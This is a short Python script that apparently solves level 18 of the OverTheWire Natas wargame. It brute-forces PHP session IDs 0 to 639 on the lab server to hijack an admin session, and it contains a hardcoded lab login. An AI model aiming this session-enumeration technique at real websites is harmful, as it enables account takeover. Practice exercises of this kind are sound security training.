#!/usr/bin/python

import urllib, requests, string

chars = string.ascii_letters + string.digits

auth = ("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")
url = "http://natas18.natas.labs.overthewire.org?"

params = {
    "debug": "true",
    "username": "test",
    "password": "test"
}


# ids = []
# while True:
#     r = requests.get(url, auth=auth, params=params)

#     php_id = r.cookies.get('PHPSESSID')
#     headers = {
#         "Cookie": "PHPSESSID=%s" % php_id
#     }

#     if php_id not in ids:

#         ids.append(php_id)

#         print('Trying ID:', php_id)
#         rs = requests.get(url, auth=auth, params={"debug": "true"}, headers=headers)
#         if "You are an admin" in rs.text:
#             print(rs.text)
#             break

for i in range(640):
    print('Trying SESSION ID:', i)
    headers = {
        "Cookie": "PHPSESSID=%s" % i
    }
    rs = requests.get(url, auth=auth, params={"debug": "true"}, headers=headers)
    if not "Session start ok" in rs.text:
        print("Something went wrong at", i)
        print(rs.text)
    if "You are an admin" in rs.text:
        print(rs.text)
        break
     